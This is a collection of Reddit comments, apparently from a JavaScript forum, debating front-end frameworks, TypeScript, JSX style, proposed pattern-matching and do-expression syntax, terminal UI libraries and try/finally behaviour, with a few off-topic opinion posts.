It depends. In many cases you can extract the business logic (and other things) out of the framework. People usually don't do this because they take naive approach to put everything in the framework. They are "framework believers" (I distrust frameworks and even if I use one, I try to isolate framework related code from the rest of the project). 
&gt; It might be fair locally, but it's not fair over the larger picture. Let's be honest, here: What you're saying is that it would be equal opportunity, rather than equal outcome, and it's your opinion that equal opportunity is unfair.
"The result was not that which I would expect from a fair process, therefore the process was not fair." Flawless logic there. "My expectations of the were not met, but the problem can't be my expectations, so it must be the event."
&gt; the sexist thing is valuing typically male professions over typically feminine ones. This is soooo backwards. Men are in more "valued" positions because they have a much higher spending burden. Men get paid more because they make career decisions that lead them to get paid for because they are in a shitty situation that making more money solves. Women who want to be mothers make decisions in their young adulthood that maximize their future flexibility, and they choose men who are financially stable to enable them to do that. Men have to react to that by taking high-stress, low-flexibility, high-paying jobs. The feminists tell everyone that this is male privilege and female oppression, and people eat it up because they, you know, want to protect women. 
Yes, I didn't want to post examples exactly for that reason. :) Maybe it's just me - but I'm not a fan of JSX. It might work well for some people, and I get the point of separation based on application functions, but I prefer to keep the templates and logic separate. Sure, some part of the logic is in the templates, but the majority is in the component methods and computed properties which are referenced in the templates.
&gt; which is the best framework to learn today ? These questions come up often. IMHO react. It has the biggest community, smallest API. Meaning for investing a bit of your time you get to be very productive and there certainly are countless job opportunities. 2) you've got this backwards. 99% people like typescript. At least I haven't yet met anyone who would claim typescript is bad. Yeah you might find some who will prefer flow, but even those people consider writing typescript to be a nicer experience than writing raw JS. So it was hated because it was a total rewrite, not because typescript. Basically they kept the name just for marketing purposes. Developers hate false marketing. 3) Since react is a library, not a framework, I'd say it's never better to use a framework. VanillaJS-if you mean writing web apps without libraries then you sure must be crazy. Only good reason not to use a library is when you think you can implement it considerably better. For example here is a lib of mine: https://github.com/capaj/object-resolve-path it does something which lodash does as well, but does it 20 times faster. 4)webpack, react, mobx, sometimes in flow, some projects in typescript, best stack ever and boy did I try lot of them 
1) Angular has some minor breaking changes so they bumped the version to 4, there shouldn't be any reason to use 2 any more and the upgrade should be straightforward. There's no best framework, all have their advantages and disadvantages - Angular and Ember are more structured so are probably better for beginners as well as across large organizations, experienced JavaScript developers will probably prefer React. 2) Angular 1 has been around for years people got used to it even with it's major design flaws. Angular 2 should really have been called something else because of the paradigm shift from the first one, it's much more dependent on tooling now so you have to adjust to this as well. 3) Only you can decide when a framework is required, I find it essential at work with people coming and going all the time - it's no fun learning the previous team members home grown framework. 4) I use React and Vue for personal projects, React and Angular 4 at work normally with TypeScript.
&gt; There's no best framework, all have their advantages and disadvantages - Angular and Ember are more structured so are probably better for beginners I hate this when I see it-you use react and vue yourself but you consider Angular and Ember better for beginners? Like beginners don't deserve to use the same tools as you, experienced programmer? That's total bullshit. Like I've suffered in the past with jQuery and Backbone.js, so I think you should too suffer with Angular and Ember before you can try the real deal? 
[removed]
That's not what OP is asking, he/she's asking if learning JS will impart some knowledge useful when learning Swift. Telling a newbie to learn React Native instead of Swift is objectively bad advice. We went from well-documented, officially supported stack (Swift), to for advanced developers. 
If you're not a programmer yet, learning Javascript will provide you with some basic programming foundations that will help you when learning Swift. Concepts like variables, functions, conditionals (if/else), etc., and structuring your code properly, can be similar across languages. JS is also a super-useful language to know. You almost certainly will have to use in the near future, so the time you invest learning now is not wasted. Don't listen to the people telling you to use React Native. That's not for newbies like you. Write iOS apps in Swift or Obj-C, since those are the officially Apple-supported stacks for iOS development, with the most documentation and the least amount of work needed to get them working. Don't start the game on Hard difficulty by trying to use things like React.
Kudos for a really great post, would you consider x-posting it to /r/programming?
In my experience new developers find opinionated frameworks easier to pick up because their hand is being held through the process, they can move onto React when they are ready.
I use jss in my company's producets. Very happy with it.
If something is easier to learn because it is structured to encourage a certain way of writing code then that makes it more beginner friendly. Experienced programmers often prefer having more free reign over how to do something. As React is just a library and not a framework they have more leeway in implementation. There is nothing to "suffer" with those frameworks. I work mostly with React but would not have any issue working with Angular 2/4 and I also happily used Angular 1.x for a few years.
&gt; There is nothing to "suffer" with those frameworks. really? not even the new `else` and `as`? https://twitter.com/jordwalke/status/880531829731639296 That stuff would make me suffer if I had to read-write it.
I said to take a look at it, not "learn this". I'm letting some one who is clearly already interested in JavaScript already, know that there are other options to mobile development suited to something they are already doing. They can make their own decisions from there.
Yes this syntax is horrible however writing if/else in jsx is pretty messy too. The experienced developer can abstract this mess away, the beginner will prefer to just be told what to do.
I agree but you could have at least recommended vue. Vue is opinionated enough for a beginner to pick up easily without the confusion the whole wast react ecosystem has in store. Yet it's a modern alternative to angular/ember.
1) Angular 2 and Angular 4 are pretty much the same, with angular-universal (server side rendering - SSR) being built into Angular 4. There may be some other minor changes but most Angular 2 code works with Angular 4. 2) While the Angular developers promised fewer object types with Angular 2, where everything is supposed to be a component, I believe that they confused the matter by keeping things like Directives but making them work differently than the old directives in Angular 1. As far as I understood, Angular 2 directives can modify the attributes of an element, such as the styles, but not the HTML within the element. Components can modify the HTML using templates. This is different than AngularJS, in which directives could do anything. Attributes also took on a whole new level of confusion since some use an asterisk, like *ngFor=, some use brackets [ngStyle]=, and some use parentheses (click)= Typescript, while difficult at first to wrap your head around, is honestly easier to deal with than ES5. After about a few hours of playing with it, I was happy with the syntax. It does require a little extra work for imports and defining property types. 3) It's almost always better to use a framework nowadays. If you're developing a multi-page website then use JQuery or something like that. However, if you're developing a single page app then use one of the many frameworks and ignore JQuery. I don't recommend trying to stick Angular or React on top of a multi-page website unless each page can be broken down into several distinct views or routes, where a page is a section of the site which runs a single page app. 4) I used to develop with Angular 1.x, but it became more limited as the website we needed to support grew. It would require a longer first request download as we added more features. Angular 4 fixes this with SSR, because the server can render the first page view and then the client can lazy-load the Javascript files. I played around with Angular 4 a bit on a personal project but found it a hassle to work with if I wanted to customize file locations and do more advanced stuff. The amount of time I spent fighting Angular was more than I was familiar with in Angular 1.x. I now develop professionally with React, as of 3 weeks ago. It took 1 day to ramp up on it, given an existing project. The use of Component for everything is what Angular aimed for but missed. React allows you to use a cli-based generator or you can structure the site in your own way. It's very flexible and has server-side rendering available (which I would highly recommend). I wasn't a fanboy of React at first because it was new, but as its adoption in the corporate environment has grown I decided to be more open minded. Now I probably wouldn't go back to Angular unless I had to, at least not for personal projects. 
&gt; writing if/else in jsx is pretty messy too. I write my if-else the same way as in JS which is ok If I am careful. You are probably referring to people using ternaries all over the place inside `{}`. Yeah that can get pretty ugly, but if you know how to structure JS code then you are all set for JSX as well. The rule of thumb is-don't use ternaries for long expressions. It should never span more than 1 or two lines. Three at maximum.
Ngrx is the redux pattern implemented with rxjs observables for watching slices of the store. It absolutely works and works really well.
Angular follows an older templating/mvc paradigm, which had many shortcomings and was quite tough to learn and use. React radically threw these concepts out, and even though it has a small (perhaps the smallest) api and learning curve, it may appear threatening because it is so different. It is certain by now that reacts paradigm is the way forward. The majority of todays frameworks use the approach to the point where you can share code between them or even switch. The principles also cross browser boundaries (react-native) and are getting adopted by mobile and desktop vendors. [A good article explaining the problems that Angular faces today](http://blog.wolksoftware.com/the-rise-of-functional-programming-and-the-death-of-angularjs) [Usage statistic for current frameworks](http://npmcharts.com/compare/react,angular,@angular/core,ember-cli,vue,@cycle/run,@polymer/polymer) (pull the slider down below back to see its growth) [Reacts eco system](https://www.npmjs.com/search?q=react) [Sites using react](https://github.com/facebook/react/wiki/sites-using-react)
Yeah, and that is where frameworks like Angular and Patterns like MVC come in. Just try to stick to those and often you are good.
mother of god angular templates will look like regex in a few versions. Did nobody notice how hard it is to read? 
Then your only way is to process the data on the server and render it to an image.
&gt; Three at maximum. Isn't that the limit? How do you use more than three lines?
Have you tried VueJS? In your view, how would it compare to your React stack that you favor?
Correct me if I'm wrong, but without runtime type information, I think it is not possible sometimes to tell the difference between an array of Points and an array of WeirdPoints. For example, if the variable obj is an empty array.
Ewww 
There aren't that many runtimes for native out there, react-native and nativescript are basically the only ones, both are kinda meh. Then there are the webview based ones, mainly cocoon and cordova. If your target is just IOS, I would consider using Swift instead which in terms of syntax is similar to how class based JavaScript would look.
Not my post, but let's do 
If a piece of code is well structured, extensible and modularized, you rarely have to rewrite everything _from scratch_. You rewrite pieces of it, module after module, until the code is renewed. With a spaghetti code, you are forced to rewrite everything throwing away most of what you previously did because there aren't ways to progressively improve and rewrite the code.
I follow the CSS BEM convention, it helps me not only in the stylesheets organization, but also to decide where a component should be split in smaller components. When you follow BEM and you see your component's classes are getting complex and describe nested structures it's time to split the component. About state management, if you see as a problem the data proxying between nested components you may want to look at the React Context API or in a store management library like Redux.
what's the use of do notation in js?
[removed]
Your question doesn't even make sense. If the data is sensitive, then surely just looking at it in the browser also exposes it? Unless you are using d3 to aggregate and summarize, in which case you are sending far too much data down the pipe for no reason. Think through your data design and interface properly, and you shouldn't even need to ask your question. It's like saying "I want to give my customers a print out but prevent them from photocopying the paper. Whst do?"
&gt; it should be done in proper time - "premature optimization is the root of all evil" (abstraction is an optimization of future effort). Now I've seen everything. Using a phrase that critiques unnecessary concreteness, to a support a thesis that we shouldn't do unnecessary generalization (where in both cases "unnecessary" remains an entirely subjective category). :-) 
The proposal isn't do-notation, it's [do expressions](https://gist.github.com/dherman/1c97dfb25179fa34a41b5fff040f9879) e.g.: const x = do { if (someCondition()) { 3 } else { try { someFoo() } catch (e) { 5 } } } In that example the value of x will either be `4`, `someFoo()` or `5`, basically the last evaluated expression is what the value of a do-block is (roughly)
Awesome! Can you explain the non-naive way to filer results? Or point in the right direction?
If this proposal makes it into the spec, I will pledge my first born to you. 
Coming from scala l, features like this are the kind of thing that would make me use js more
&gt; Add those 2 features and we can call JavaScript done as far as I'm concerned I'd really like nice syntax for partial application. Something like `foo(a, b, ...)` or `foo:(a, b)`. That would give JS most of the benefits of currying but without the downsides of currying. It also would go really well together with `|&gt;`.
https://www.stackoverflow.com
I dislike typescript because of the compiler mostly. Types are awesome (which, yeah, is why I use flow)
Already posted. Love that place!
This describes most of the map/reduce code that I come across
Ah, I see. That's definitely useful.
&gt; Only good reason not to use a library is when you think you can implement it considerably better. Except that you'll probably miss loads of edge cases. If you do have a truly better method why not contribute back to the library? 
Thanks! 
Nature of code by Daniel Shiftman. It will walk you through building physics engines. Respect walls, follow mouses or moving objects, etc etc.
no vt100 color/position control?!? Animals.
Awesome!
People come up with the most bizarre things far too often than necessary to make up for some software's shortcomings.
NPM package is also available now.
stolen by who? you can issue TTL on keys and give them out after people log in. your questions are quite vague
The best way to factor this is with a discriminated union, which we can already do today with a switch..case block. Encouraging the use of undiscriminated unions through pattern matching seems to add complexity to the language, and encourage lower-performance way of factoring code. What are your thoughts about this?
I didn't read the article (can't be bothered) but it's more correct to say Electron : FE = Air : Flash
EDIT: oh, Ember fanboys downvoting, bless Forget Ember - it's much, much less popular than the other two (except for in Seattle, apparently). It's like comparing the US (React), China (Angular), and Switzerland (Ember). It has its uses, but if anything Polymer is a better bet. And of course Vue is trending at the moment (Ember isn't, and never will) It's only discussed because of clickbaity "5 frameworks you need to know today!" kind of articles
A person on a Slack group I'm part of had these janky donut charts on their website, and wanted to change the width of the stroke of the charts, but the implementation was so janky (CSS clip paths and stuff) that it woulda been a PITA to make it work. So I took an hour and made this: https://codepen.io/dgca/pen/jwZGqv She was happy with it. I gotta stop working for free.
That is an interesting concept. Currently, all was developed in php that generates a png to display. It is very static. With charting libraries like d3, users could manipulate variables to quickly get a visual representation of those changes. In it's simplest form, it is a polynomial equation that generates the chart that is special, no so much the data - though the equation could be extrapolated from the data if given enough of it through linear regression and why I still consider it sensitive. I will look into R and Node.js/jsdom to see if I can accomplish the task. Thank you for your suggestions.
Yeah, I was hoping this was not the only case. I was hoping users could benefit from changing the output dynamically through changing variables with, say, sliders so they could quickly find representative charts.
It is the way the data is formulated that is confidential more than the data itself, though one could get the formulation if one had enough data. Users need to see what an equation does with varied parameters. They do not need to see or understand the calculation to get the data points, they just need to see the data points. So we put the data together in a unique way so that it enables the user to quickly know if it is a fit for their requirement or not. I think the analogy here is that I want users to "play the game" but not how to cheat it by knowing how it works. Does that make sense?
You are correct about the key value part, you are adding functions using the key you pass in as the module name, and deps are any modules that the new module depends on, which will be included as parameters in the new module. Personally I don't use this pattern, I prefer es6 or commonjs modules, which are effective as closures and are a lot more intuitive.
pointer-events: none It makes mouse events go straight through that element.
I think your question is not a JavaScript question. There are ways you can do it with JavaScript but I think in this case CSS is going to be your friend. When you have overlayed 2 elements with each other you want to disable the "pointer events" of the element that is on top. Check out these pages for more info. - [MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/pointer-events) - [CSS-Tricks](https://css-tricks.com/almanac/properties/p/pointer-events/) Good luck. 
For sure there's a ton of stuff I'd like to see in the language. But JS is already a very complex and bloated one. Stuff like classes introduced a lot and still requires a lot more to be useful at all. So while I have a long list of what I'd like to see in it, at what point should we just have a new language based on Web Assembly and go that route to get our wishlist? Thus, IMO, JS has "enough" (or at least, is at the point where they really need to slow down on new features). I'm just being a spoiled brat by wanting this pattern matching stuff in :) But I still don't think we should had dozens over dozens of extra features.
the amount of work i've done for free to impress women is truly frightening D:
Hi /u/grouseydaryl, it looks like you're new to /r/javascript, welcome! Thanks for the submissions, but please make sure you read our [guidelines](http://www.reddit.com/r/javascript/wiki/index). In short, you should post from a variety of sources, and not just your YouTube channels. Thanks for your consideration!
I probably should in the case of lodash.get, but by better I meant better fitting for your usecase, not just better by performance metrics.
That sounds perfect. I generally try to avoid jQuery until I feel I am proficient with vanilla JS, but in this case using Axios sounds like a good idea.
Yeah, this is barely a terminal.... More of a fancy textarea.
Looks like a strong competitor to Hyper! https://github.com/zeit/hyper
We are working on the interactivity part, will definitely add some features taking inspiration from hyperterm and hyper.
Little project I worked on for my own usage because I didn't find any alternatives that did what I was looking for. https://github.com/patrickfatrick/slogged It is a socket.io logger middleware inspired by the look and feel of koa-logger, and slightly customizable. 
How about matching a resolved or rejected promise?
In case your curious https://medium.com/@ericwooley/make-output-readable-again-controlling-your-io-streams-in-node-bc6547a1b146 Edit: Not waiting to publish, got impatient. https://www.reddit.com/r/javascript/comments/6m2cid/make_output_readable_again_controlling_your_io/ 
Reminiscent of the 28 laws of power
I'm not one to downvote for differing opinions, but if you're going to knock down something that everyone else here is excited for, at least try to be constructive.
What you're asking is very strange. Do you want to give the data to your users or not? &gt; It is the way the data is formulated that is confidential more than the data itself, though one could get the formulation if one had enough data. Then just rate limit your API so they can't get "enough data". Problem solved. &gt; I think the analogy here is that I want users to "play the game" but not how to cheat it by knowing how it works. Does that make sense? If merely knowing how a game works is enough to cheat then the game isn't designed properly. I would advise you to stop being so overly protective of whatever you have. Keep the magical algorithm server-side but don't be so paranoid about serving the output to your users. If they really want to reverse engineer this thing they'll find a way even if you're only serving them images.
&gt; Does the bump in processor speed really matter? No. Most of the work you do will be I/O bound. CPU speed will make almost no difference. Also this subreddit is for talking about JavaScript, not PC recommendations.
Generally speaking, the more you know Javascript (and especially things like how `this` works), the easier it will be to learn React. With React, you don't normally write code that modifies the DOM yourself. Instead, your components "render" object trees that describe how you _want_ the DOM to look now, and React takes care of doing the required updates (that's the "Virtual DOM" term you've heard). I'll go ahead and give you my standard advice for getting started with React: The article "A Study Plan to Cure Javascript Fatigue" ( https://medium.freecodecamp.com/a-study-plan-to-cure-javascript-fatigue-8ad3a54f2eb1 ) is a great place to start. It gives an excellent series of steps for tackling modern Javascript concepts one piece at a time: Javascript, React, ES6, and state management. There's also a "Front-End Study Guide" based on that article that's very good, at https://github.com/grab/front-end-guide . On that note, definitely don't over-complicate the learning process by trying to learn many different things at once. Some people will say you should use a "boilerplate" to learn React, and they're wrong - boilerplate projects almost always come with too many pieces configured, and are confusing for beginners. Instead, the best advice is to focus on learning React itself first. Once you have a good understanding of how React works, you will better appreciate why a state management library like Redux can be useful, and you can learn about other tools later. You should start out by reading through the official React docs and tutorial at https://facebook.github.io/react/, and I'd encourage you to use the official Create-React-App tool ( https://github.com/facebookincubator/create-react-app ) for setting up projects. It creates a project with a solid build setup, with no configuration needed on your part. There's an excellent post called "Simple React Development in 2017" ( https://hackernoon.com/simple-react-development-in-2017-113bd563691f ) that gives some more specific instructions on the actual steps to follow. Past that, I keep a big list of links to high-quality tutorials and articles on React, Redux, and related topics, at https://github.com/markerikson/react-redux-links . Specifically intended to be a great starting point for anyone trying to learn the ecosystem, as well as a solid source of good info on more advanced topics. It includes links for learning core Javascript (ES5), modern Javascript (ES6+), React, and much more. I also published an "Intro to React (and Redux)" presentation at http://blog.isquaredsoftware.com/2017/02/presentation-react-redux-intro/ , which is a good overview of the basic concepts for both React and Redux. Finally, the Reactiflux chat channels on Discord are a great place to hang out, ask questions, and learn. The invite link is at https://www.reactiflux.com .
Thanks for the input, exactly what I was looking for. Apologies for the incorrect sub - wanted to get a perspective from other javascript devs not gamers and video editors.
Here's the same list with GH stars: https://github.com/Delapouite/css-in-js/tree/stars
I tried to turn your GitHub links into [permanent links](https://help.github.com/articles/getting-permanent-links-to-files/) ([press **"y"**](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) to do this yourself): * [Delapouite/css-in-js/.../**0c6f3377e73828863cd17d84bb28b1e3411431c3** (stars → 0c6f337)](https://github.com/Delapouite/css-in-js/tree/0c6f3377e73828863cd17d84bb28b1e3411431c3) ---- ^(Shoot me a PM if you think I'm doing something wrong.)^( To delete this, click) [^here](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply djybuk0.)^.
Actually, with 3GB/s (yes, gigaBYTES) and some 100000 io/s a lot of stuff will be CPU bound on the new MacBook Pros.
So — where do you need help with deciding? Your post is very unclear. What are your choices?
Also take a look at: https://github.com/zackargyle/react-bash 
Remember that RAM is important, because you would probably want to run web browser sometimes. 
What is this `createImg()` method ? Is it using `document.createElement("img")` ? 
Whats wrong with using multiple terminals? using iTerm2 you can even setup working spaces that will automatically bootstrap your workday.
What is the use case?
Nothings wrong with multiple terminals. I just like streamlining as much as possible. I don't know about you, but i work with a lot of projects. Remembering workflows, and which commands need to run for all of them gets annoying. 
What drives you to write the proposals? Does it help with job searching?
All I really want to know is if a 1ghz speed bump on your processor matters for a javascript developer. That's the only real difference between the two computers. If I'm not going to notice than I'm not going to bother paying for it.
It could be more hyper, if you know what I mean. 😉
Why ember isn't popular or trending and you say it never will ?
It is perhaps strange, but is what I'm up against. &gt;Do you want to give the data to your users or not? Simply put, no. I want to give them only the visualization of the data in a certain arrangement. Yes, if they really want to reverse "this thing", we're not ready to make it any easier on them. I will take your advisement under consideration, but it is what it is. If the underlying algorithm, equation and ultimately data cannot be abstracted away or wrapped up inside a variable hidden from users, then I will be forced to abandon whiz-bang libraries like d3.js and simply serve static images. I was hoping the that there was a case for the not-so-obvious way of doing this that I could be pointed in the right direction. It's not the end of the world, just hoping for a better way to display info that helps end users quickly understand what they need.
No it's not. *Hyper* is a terminal emulator, *Terminal in Reac*t is a terminal UI for your website.
https://github.com/nitin42/terminal-in-react#where-to-use-
https://i.gyazo.com/2a3972dcc4336efe45435d2a44b5ce95.png this should answer !
Hehe!! Yup..
Awesome! Starred 😄
Thanks!
Do you test your own stuff via virtualization? I tend to keep Windows 7/8.1/10 in VM's so I can test things and be confident in doing so, which virtualization doesn't need an insane processor, it must support vt-d/amd-v. Most devs don't have to test anything though, so I can't see a real use for a heavy CPU. 
So the solution I gave loops over each data item, and if its first or last name starts with the user's input, then it keeps that data item. There are a few low hanging improvements you could make: - Make a case insensitive comparison - Don't just check if the first or last starts with the given text, but check if the text appears *anywhere* in the first or last name And some harder improvements you could make: - Assign a score to each result, and sort on that (for example, weigh a match on last name more heavily than a match on first name) - Make the search faster. `filter` currently runs in O(N*K) time (where N is the number of items in `data` and K is the length of the `text` string) and O(N) space. You could improve the N component of that with a [Radix Tree](https://en.wikipedia.org/wiki/Radix_tree) or similar data structure, and you could improve the K component with a faster text searching algorithm that preprocesses the nodes into hashes first, eg. [Rabin-Karp](https://en.wikipedia.org/wiki/Rabin%E2%80%93Karp_algorithm).
**Radix tree** In computer science, a radix tree (also radix trie or compact prefix tree) is a data structure that represents a space-optimized trie in which each node that is the only child is merged with its parent. The result is that the number of children of every internal node is at least the radix r of the radix tree, where r is a positive integer and a power x of 2, having x ≥ 1. Unlike in regular tries, edges can be labeled with sequences of elements as well as single elements. This makes radix trees much more efficient for small sets (especially if the strings are long) and for sets of strings that share long prefixes. *** **Rabin–Karp algorithm** In computer science, the Rabin–Karp algorithm or Karp–Rabin algorithm is a string searching algorithm created by Richard M. Karp and Michael O. Rabin (1987) that uses hashing to find any one of a set of pattern strings in a text. For text of length n and p patterns of combined length m, its average and best case running time is O(n+m) in space O(p), but its worst-case time is O(nm). In contrast, the Aho–Corasick string matching algorithm has asymptotic worst-time complexity O(n+m) in space O(m). A practical application of the algorithm is detecting plagiarism. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/javascript/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^] ^Downvote ^to ^remove ^| ^v0.24
Added a cool new feature. Download the new update!
This might be helpful: function RainCloud(x,y) { this.x=x this.y=y this.cloud1=createImg("imgs/clouds.gif") this.cloud1.position(500+this.x,1990+this.y) this.drop1=createImg("imgs/drops.gif") this.drop1.position(0+this.x,2150+this.y) } RainCloud.prototype.position = function(x,y){ this.x=x this.y=y this.drop1.position(0+this.x, 2150+this.y) this.cloud1.position(500+this.x,1990+this.y) }; // so to create one at position 0,0 do this. var myRainCloud = new RainCloud(0,0) // And to reposition it if you want. myRainCloud.position(500,500) this was written on mobile, so I may have made some mistakes or auto corrections.
aside from "for fun", terminal programs are dirt simple to write and even use. Write a string, read a string, do something, repeat. The only user interaction decision is really verbiage (unless you get fancy with color and position). Certain groups of users will be much more productive not reaching for the mouse as well.
https://codepen.io/TrevorWelch/full/BZrBxx/ It isnt anything impressive. I'm still learning Javascript through FreeCodeCamp. I've been working on the TicTacToe challenge for a week now and I finally finished it. Nothing fancy, but I feel accomplished :)
I've been reading about module design patterns and found one that encapsulates well, and even exposes its methods as immutable properties. I want to know what this pattern is called though - it's doesn't quite look like either a constructor nor a factory. Anyone have a thought?
Functions in JS always return something. If you don't return something explicitly, undefined is returned.
Look into jsonp. That's what is being provided 
Yup. An `async` function that doesn't return anything is essentially equivalent to `Promise.resolve()`. And sometimes that's entirely valid. Sometimes I only care that something has finished, and I don't need anything back from it.
Thanks for your thoughts! Curious, how are you using switch/case with discriminated unions? This proposal will include "brand checking" so you can match, e.g., Date or MyClass. With a proposal like [`traits`/`mixins`](https://github.com/michaelficarra/ecmascript-interfaces-proposal) you can get something even closer to discriminated unions. Hard to comment on performance without knowing what you're comparing against but in general matching can be faster than repeated if conditions because we can generate an optimal sequence of tests on the match value to discriminate among the match legs.
This makes a lot of sense actually. One of the problems that was reporting to the client was that a property of value "undefined" was unreadable. I'll keep an eye out for that in the future!
I wrote it up because I miss it, I've heard many people say they miss it, and almost everyone I talk to about it is pumped! I'm lucky enough to work at a place where this is my job but if I end up doing a search I'll let you know how it works out :-P
That's just a one-dimensional array. Does that come as a string?
Looks like a factory... where the object being created is also a function... for some reason.
The real difference you'll notice is the vastly superior SSD. The CPU upgrade is nice but not essential IMO.
Thanks for the lead, I'll look into that!
This is the output when I fetch that URL: completion = ["logitech",["logitech mouse","logitech headset","logitech gaming mouse","logitech mx master","logitech webcam","logitech wireless mouse","logitech g602","logitech keyboard","logitech c920","logitech g430"],[{"nodes":[{"name":"Electronics","alias":"electronics"},{"name":"Computers","alias":"computers"}]},{},{},{},{},{},{},{},{},{}],[],"1LNOQQXIW4EZF"];updateISSCompletion();
I just wanted to say huge thank you for championing both this and pipleine operator proposals - you are awesome!
How much ram will I need to install to run this shit
yea seems a bit good so it will probally take me half a half hour of trial and error later so something to try..cheers.... i imagine its effort on phone tho a handy keyboard would be easier. also i use a keyboard and still i have proper spelling mistakes haha.. 
yea i belive so .,,,,.,.,./,., but when i searched for a refrence for the connection i found nothing sorry. i mostly try p5js and processing and so i learnt it thru the coding train.... enjoy
This is precisely my plan. Partial application: `foo(a, ?)`, returns a function such that `foo(a, ?)(b)` is `foo(a, b)`. Combined with pipeline operator this lets you easily select which parameter to pass the LHS to.
For sure. I upgraded to an iMac with 4Ghz, and build times have slashed in half. Also with 32GB of memory, hungry PyCharm can get a memory leak and I won't notice it for at least 6 hours.... unlike previously when it would become sluggish within minutes.
I really wish there were some example screen captures in this article or the README. I'm on my phone, so I can't try things — it'd be great to be able to look at examples without needing to clone and configure something. 
ok fine. I'm officially not using reddit anymore. Everything is too restrictive.
Yeah, it's definitely some sort of factory pattern, but someone is trying to be unnecessarily clever. Looks like the main goal is to provide getters/setters for a scoped `width` / `height` without giving direct access to the vars themselves.
Just pick any metric of your choice (google trends, github stars, npm downloads, reddit posts...) and show me that Ember is in the same league as React / Angular. I may be wrong on the 'it never will' of course. But I have been in the industry for a long time and I think I can spot trends by now. Ember is too big and difficult to learn - like Angular, but without Google behind it. If it hasn't become trendy by now I don't think it will. Vue, for example, has had a steady growth in articles and buzz around it - it may not translate into actual usage, that's why I'm saying "it's trending" and not "it's the next big thing", it may turn out to be just a fad. Ember is not even that (sorry fanboys!)
16GB is often not enough for Chrome.
Except those attributes aren't valid for that HTML element. If you want to use custom attributes, they should be prefixed with "data", eg. data-foo="bar".
You can't have both. If they're working with the data in the browser they've already got it. If they're not, it will be slower to get them updated graphs.
Can you mention what the key issues needing addressed before a Babylon plugin are? I love the proposal. The syntax feels very comfortable. I love pattern matching in Haskell, and glad to see it (hopefully) coming to JS. 
Very cool. It’s amazing how much you can optimize even something as simple as a search box. 
Using Preact (or React or Vue or Angular etc.) doesn't prevent from writing spaghetti code. 
isometric rendering is actually not so hard. https://gamedevelopment.tutsplus.com/tutorials/creating-isometric-worlds-a-primer-for-game-developers--gamedev-6511
Better to have a processor that more accurately matches what your average user will have. That way you won't fall into the trap of thinking your code is super efficient, while your users are trudging through mud cursing you.
[Ken Wheeler](https://twitter.com/ken_wheeler) was complaining about `The Platform` on Twitter this past week (surprise) about the web not have an image picker API so I decided to make an image picker package that works in both React and React Native projects. The caveat here being users will have to press on something to initialize the image picker. You can find it [here](https://github.com/mini-eggs/react-native-everywhere-image-picker).
Almost everything can be "not so hard" in isolation, the difficult part is when you have more and more stuff, content, code, processes, developers, and managers. The architecture, legal requirements, performance optimizations and the organization, hiring, planning, cost controls. These complexities in large applications are real, and frameworks often offer interfaces and rules for solving problems other people already solved. It's very nice that they built it on their own. It's fun and educational building your own stuff, they should be appreciative that they could use their stakeholders' money for fun and education. 
lol. why are you doing this?
You could throw in the finally block (which is a violation of the contract). This would halt further execution, as would return. I'm choosing to interpret your question as "is there any way to stop the execution of the whole block". Relatedly, I have a counter question: is there any way to make max int smaller than max int?
I can but it takes glue.
https://github.com/joshmarinacci/node-pureimage I just pushed out a new release of my open source pure JS Canvas drawing lib. It's a complete refactor, now supports image scaling and anti-aliased paths Pure JS, no native addons or deps required. It can load and save PNGs and JPEGs and fonts. 
It has a few semantics that [are learned quickly](https://egghead.io/courses/react-fundamentals). If you know javascript you'll realize quickly that there's not much to learn. The main difference is that you expression UI as a function.
The author probably does SSR the wrong way.
Solving [#11](https://github.com/tc39/proposal-pattern-matching/issues/11) could mean significant changes to the syntax. Once that's solved it might be reasonable to begin implementing, but in general everything is open to change at this point.
That's true, it's also one thing from my list. Are they never going to expand the product or try to take money, post content, translate to other languages, comply with disability laws, have user or group management, track usage and analytics, etc? If not, cool, but it's not exactly business then.
If you REALLY want to do this, have a flag outside your try / finally that is basically "doStuffInFinally" and set it to false if you don't want to do that stuff, and then have an "if" in the finally block that checks the value of the flag. But as others have said, this seems like something strange and it may be better to think about why you're trying to do this first. Generally you put things in the finally block that need to happen regardless of what goes on in the try/catch, normally things such as closing connections or releasing locks.
Worth noting (and I think it is mentioned) if you are transpiling to ES5, that is essentially the pattern that the code will be changed to. For the most part favor using more clear/understandable code unless performance is the primary concern.
My google-foo is failing me. You happen to have a link to something I can read up on about this? Edit: Found this [Window Arrangements](http://chris-schmitz.com/develop-faster-with-iterm-profiles-and-window-arrangements/) write up which sounds like what is being described
As far as I'm concerned the only way you wouldn't reach the `return 2` is if an error is threw inside the finally. Not even trying to break from a loop would work.
Please don't actually use this "pattern". It looks really painful.
Interesting, nice to see another route for this. I just switched to Netlify as they opened up their free tier to have all their past premium features including pre-rendering. My site has been getting indexed by Google wonderfully, with almost 0 extra effort code wise on my side. Highly suggest it (free!!!!)
Why not use Next.js? That seems like the de facto solution at the moment
from the spec The production TryStatement : try Block Finally is evaluated as follows: Let B be the result of evaluating Block. Let F be the result of evaluating Finally. If F.type is normal, return B. Return F. In both cases you return from try. In case 1 you .log in finally so F.type is normal, so return 1 In case 2 you return in finally so F.type is return, so return 2
Nah. Javascript has already become way too complicated compared to what it used to be. If you want *even more* syntactic sugar, you'll have to show a very strong case for usefullness. If my negative whining gives these suggestions a feeling of upphill battle, then that's a good thing.
Eh, the only reason I care about this is just to have a decent switch statement without having to put `break` after every case, like every other notable modern language does (Kotlin, Rust, Nim, etc). Functioning as a return and being able to match against object structures are just a bonus.
Are you talking about the article or the library at the bottom?
Correct; the whole point of `finally` is that it always runs no matter what. If you don't want that to happen, don't use `finally`. If you need more complex behavior, use `if` statements to conditionally execute stuff or not execute it.
Finally is working as intended.
